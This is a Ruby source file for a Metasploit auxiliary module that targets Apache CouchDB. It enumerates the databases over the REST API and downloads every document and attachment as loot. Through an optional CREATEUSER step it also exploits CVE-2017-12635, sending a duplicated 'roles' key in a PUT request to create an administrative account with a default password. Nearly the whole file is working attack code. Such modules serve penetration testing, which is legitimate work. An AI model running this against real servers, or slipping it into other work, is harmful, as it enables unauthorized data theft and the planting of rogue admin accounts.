##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CouchDB Enum Utility',
      'Description'    => %q{
        This module enumerates databases on CouchDB using the REST API
        (without authentication by default).
      },
      'References'     =>
        [
          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API'],
          ['CVE','2017-12635'],
          ['URL','https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635'],
          ['URL','https://justi.cz/security/2017/11/14/couchdb-rce-npm.html']
        ],
      'Author'         => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
                            'Hendrik Van Belleghem - @hendrikvb'
                          ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/_all_dbs']),
        OptBool.new('SERVERINFO', [true, 'Print server info']),
        OptBool.new('CREATEUSER', [true, 'Create Administrative user - ']),
        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12,"")]),
        OptString.new('HttpPassword', [true, 'CouchDB Password', 'password']),
        OptString.new('RPORT', [true, 'CouchDB Port', '5984']),
        OptString.new('RHOST', [true, 'CouchDB Host', '']),
        OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])

      ])
  end

  def valid_response(res)
    return res.code == 200 && res.headers['Server'].include?('CouchDB')
  end

  def get_dbs(auth)
    begin
      res = send_request_cgi(
        'uri'           => normalize_uri(target_uri.path),
        'method'        => 'GET'#,
        #'authorization' => auth
      )

      temp = JSON.parse(res.body)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
      print_error("#{peer} The following Error was encountered: #{e.class}")
      return
    end

    if valid_response(res)
      print_status("#{peer} Enumerating Databases...")
      results = JSON.pretty_generate(temp)
      print_good("#{peer} Databases:\n\n#{results}\n")
       path = store_loot(
        'couchdb.enum',
        'application/json',
        rhost,
        results,
        'CouchDB Databases'
      )

      print_good("#{peer} File saved in: #{path}")
      res.get_json_document.each do |db|
        res = send_request_cgi(
          'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs?include_docs=true&attachments=true"),
          'method'=> 'GET',
          'authorization' => auth
         )
         if res.code != 200
           print_bad("Error retrieving database. Consider providing credentials.")
           return
         end
         temp = JSON.parse(res.body)
         results = JSON.pretty_generate(temp)
         path = store_loot(
           "couchdb.#{db}",
           "application/json",
           rhost,
           results,
           "CouchDB Databases"
         )
         print_good("#{peer} #{db} saved in: #{path}")
      end
    else
       print_error("#{peer} Unable to enum, received \"#{res.code}\"")
    end
  end

  def get_server_info(auth)
    begin
      res = send_request_cgi(
        'uri'           => '/',
        'method'        => 'GET',
        'authorization' => auth
      )

      temp = JSON.parse(res.body)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
      print_error("#{peer} The following Error was encountered: #{e.class}")
      return
    end

    if valid_response(res)
      # Example response: {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}

      print_good("#{peer} #{JSON.pretty_generate(temp)}")
      report_service(
        host: rhost,
        port: rport,
        name: 'couchdb',
        proto: 'tcp',
        info: res.body
      )
    else
      print_error("#{peer} Unable to enum, received \"#{res.code}\"")
    end
  end

  def create_user
    username = datastore['HttpUsername']
    password = datastore['HttpPassword']
    rport = datastore['RPORT']
    rhost = datastore['RHOST']
    roles = datastore['ROLES']
    timeout = datastore['TIMEOUT']
    uripath = datastore['URIPATH']

    data = "{
\"type\": \"user\",
\"name\": \"#{username}\",
\"roles\": [\"#{roles}\"],
\"roles\": [],
\"password\": \"#{password}\"
}"
    res = send_request_cgi(
    { 'uri'    => "http://#{rhost}:#{rport}/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
      'method' => 'PUT',
      'ctype'  => 'text/json',
      'data'   => data,
    }, timeout)

    if res && res.code == 200
      print_good("User #{username} created with password #{password}. Connect to http://#{rhost}:#{rport}/_utils/ to login.")
    else
      print_error("Change Failed :(")
    end
  end

  def run
    username = datastore['HttpUsername']
    password = datastore['HttpPassword']

    auth = basic_auth(username, password) if username && password
    if datastore['SERVERINFO']
      get_server_info(auth)
    end
    if datastore['CREATEUSER']
      create_user
    end
    get_dbs(auth)
  end

end
